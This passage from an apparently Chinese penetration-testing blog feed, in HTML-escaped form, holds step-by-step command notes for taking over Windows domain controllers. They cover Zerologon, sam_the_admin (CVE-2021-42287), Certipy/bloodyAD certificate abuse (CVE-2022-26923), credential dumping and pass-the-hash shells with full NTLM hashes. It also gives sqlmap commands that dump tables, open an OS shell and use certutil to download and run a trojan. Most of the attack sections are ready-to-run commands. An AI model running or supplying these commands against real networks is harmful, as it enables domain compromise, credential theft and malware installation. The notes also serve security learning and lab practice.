prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;验证漏洞是否存在&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 zerologon_tester.py OWA2010CN-GOD 192.168.3.21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;b. 重置DC密码，获取&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;重置 DC 密码：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 cve- 2020 - 1472 - exploit.py OWA2010CN-GOD 192.168.3.21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用impacket包中的secretsdum.py来获取相关的HASH:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 secretsdump.py god.org/OWA2010CN-GOD\$@192.168.3.21 -no-pass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;c. 通过wmicexec.py使用&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;获取DC的shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取HASH后，可以利用wmiexec.py登录，从而获取一个shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python wmiexec.py -hashes &amp;lt;HASH&amp;gt; DOMAIN/DOMAIN_USER@DC_ipaddr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;wmi连接反弹&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 wmiexec.py god/administrator@192.168.3.21 -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;cve-2021-42287&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2021-42287&#34;&gt;#&lt;/a&gt; CVE-2021-42287&lt;/h4&gt;
&lt;p&gt;参考地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9uZXcucXEuY29tL3JhaW4vYS8yMDIxMTIxN2EwYnJtZjAw&#34;&gt;https://new.qq.com/rain/a/20211217a0brmf00&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;前提条件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一个普通域成员帐户 + 域用户有创建机器用户的权限（一般默认权限）+ DC 未打补丁 KB5008380 或 KB5008602。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;工具下载&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;sam_the_admin.py: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1dhemVIZWxsL3NhbS10aGUtYWRtaW4=&#34;&gt;https://github.com/WazeHell/sam-the-admin&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;漏洞利用&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;从域外环境已知域内一个普通用户密码直接拿DC shell或者域内所有&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 sam_the_admin.py god/&amp;#x27;mary:admin!@#45&amp;#x27; -dc-ip 192.168.3.21 -shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;cve-2022-26923&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2022-26923&#34;&gt;#&lt;/a&gt; CVE-2022-26923&lt;/h4&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8zMzU0NzEuaHRtbA==&#34;&gt;https://www.freebuf.com/vuls/335471.html&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;前提条件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一个域内普通账号 + 域内存在证书服务器&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;工具下载&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2x5NGsvQ2VydGlweQ==&#34;&gt;https://github.com/ly4k/Certipy&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0NyYXZhdGVSb3VnZS9ibG9vZHlBRA==&#34;&gt;https://github.com/CravateRouge/bloodyAD&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1NlY3VyZUF1dGhDb3JwL2ltcGFja2V0&#34;&gt;https://github.com/SecureAuthCorp/impacket&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2RpcmtqYW5tL1BLSU5JVHRvb2xz&#34;&gt;https://github.com/dirkjanm/PKINITtools&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;漏洞利用&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;a. 首先需要获取域控服务器，域证书服务器的一些基本信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在受控的主机上执行powershell命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Get-ChildItem Cert:\LocalMachine\Root\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;得到域证书服务器地址fenghuotai-DC-CA，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;域控服务器地址fenghuotai.local，域控计算机名为dc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;b. 设置攻击机的DNS服务器地址为域控DNS服务器地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.1.15 fenghuotai.local dc.fenghuotai.local fenghuotai-DC-CA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;c. 使用掌握的域内普通用户账号申请证书并验证登录，测试复现环境是否异常&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;申请证书 可能会遇到NETBIOS超时现象，重新执行一次申请证书命令即可&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;certipy req &amp;#x27;fenghuotai.local/testcve:1qaz3edc.@dc.fenghuotai.local&amp;#x27; -ca fenghuotai-DC-CA -template User&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;验证该证书，获取其NT &lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;certipy auth -pfx testcve.pfx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;d. 新建账号pwnmachine，配置DNShostname，并申请域控dc$的证书&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;新建一台名为pwnmachine，密码为CVEPassword1234*的机器账号：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python bloodyAD.py -d fenghuotai.local -u testcve -p &amp;#x27;1qaz3edc.&amp;#x27; --host 192.168.220.160 addComputer pwnmachine &amp;#x27;CVEPassword1234*&amp;#x27;，&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;设置其dNSHostName 属性为域控服务器属性：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python bloodyAD.py -d fenghuotai.local -u testcve -p &amp;#x27;1qaz3edc.&amp;#x27; --host 192.168.220.160 setAttribute &amp;#x27;CN=pwnmachine,CN=Computers,DC=fenghuotai, DC=local&amp;#x27; dNSHostName &amp;#x27;[&amp;quot;dc.fenghuotai.local&amp;quot;]&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;申请新建的机器账号pwnmachine$的证书，其实申请到的是域控dc$的证书：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;certipy req &amp;#x27;fenghuotai.local/pwnmachine$:CVEPassword1234*@192.168.220.160&amp;#x27; -template Machine -dc-ip 192.168.220.160 -ca fenghuotai-DC-CA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;进行登录验证，获取其NT &lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;certipy auth -pfx ./dc.pfx -dc-ip 192.168.220.160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;e. 获取域内所有账户&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;，通过&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;获取shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用impacket工具examples目录下的secretsdump.py脚本：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 secretsdump.py &amp;#x27;fenghuotai.local/dc$@dc.fenghuotai.local&amp;#x27; -hashes :xxx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;获取到域控的shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 wmiexec.py fenghuotai.local/administrator@192.168.1.15 -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;还可以使用PKINITtools工具，获取域控最高权限shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
        <category term="渗透测试" />
        <updated>2022-12-29T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2022/12/30/SAFE/2%20WEB%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/</id>
        <title>XD22 2 Web 通用漏洞</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2022/12/30/SAFE/2%20WEB%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/"/>
        <content type="html">&lt;h3 id=&#34;sql-注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql-注入&#34;&gt;#&lt;/a&gt; sql 注入&lt;/h3&gt;
&lt;h4 id=&#34;sqlmap-测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-测试&#34;&gt;#&lt;/a&gt; sqlmap 测试&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;sqlmap 测试是否存在sql注入：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sqlmap -r sqlmap.txt --batch --dbs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sqlmap -r sqlmap.txt --batch -D Machine --tables&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sqlmap -r sqlmap.txt --batch -D Machine -T login --columns&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sqlmap -r sqlmap.txt --batch -D Machine -T login -C username,password,role --dump&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sqlmap -r sqlmap.txt --sql-shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;是否高权限用户&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sqlmap -r sqlmap.txt --batch --is-dba &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;清除缓存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sqlmap -u (http://127.0.0.1/q.php?id=1 --purge &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sqlmap -r sqlmap.txt --file-read &amp;#x27;/var/lib/www/1.php&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sqlmap -r sqlmap.txt --file-write &amp;#x27;d:/w.txt&amp;#x27; --file-dest &amp;#x27;d:/h.txt&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;编码注入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sqlmap -r sqlmap.txt --batch --tamper=base64encode.py &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;sqlmap通过注入点下载木马并执行：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sqlmap -r sqlmap.txt --os-cmd=&amp;quot;certutil.exe - urlcache - split - f [http://127.0.0.1:81/t.exe](http://127.0.0.1:81/t.exe) d:/e.exe&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sqlmap -r sqlmap.txt --os-cmd=&amp;quot;d:/e.exe&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;弹出系统命令对话框但是执行速度会非常慢&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sqlmap -r sqlmap.txt --os-shell &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;++ 数据包中如果某参数后有’*&#39; 号表示从此注入，否则全部尝试注入，可以放在 X-Forawad-for 后等&lt;/p&gt;
&lt;h4 id=&#34;手工-sql-注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工-sql-注入&#34;&gt;#&lt;/a&gt; 手工 sql 注入&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;对 history.php 所在的 url 地址尝试手工判断是否是注入点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.208/history.php?user=admin%27%20and%201=1--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span 